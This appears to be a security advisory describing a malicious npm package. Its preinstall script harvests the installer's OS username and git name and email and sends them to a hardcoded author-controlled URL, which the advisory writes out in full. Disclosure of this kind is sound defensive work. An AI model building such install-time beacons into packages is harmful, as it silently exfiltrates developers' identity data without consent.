summary: preinstall script exfiltrates OS username and git identity to hardcoded author-controlled host
details: On `npm install`, the package's preinstall lifecycle script (dist/preinstall.js) reads the installer's OS username via `os.userInfo()` and parses `~/.gitconfig` via iniparser to extract `user.name` and `user.email`, then issues an HTTPS GET to the hardcoded endpoint `https://2tak.l.serverhost.name:1962/mobile/reext?osname=<user>&gitname=<name>&gitemail=<email>`. The beacon is guarded only by a check that skips the author's own OS username (`xmarcgusmano`), confirming the author is aware this install-time callback should not fire on their own machine. The README does not disclose any telemetry. Every installer's identity (OS username + developer name + developer email from the git config) is silently transmitted to the author's server at install time, without consent. This is an install-time exfiltration of installer identity data to an author-controlled endpoint — a textbook unauthorized telemetry / active-attack pattern. The fact that only identity metadata (not AWS keys or SSH keys) is exfiltrated keeps severity at high rather than critical, but installer harm is concrete and non-consensual.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
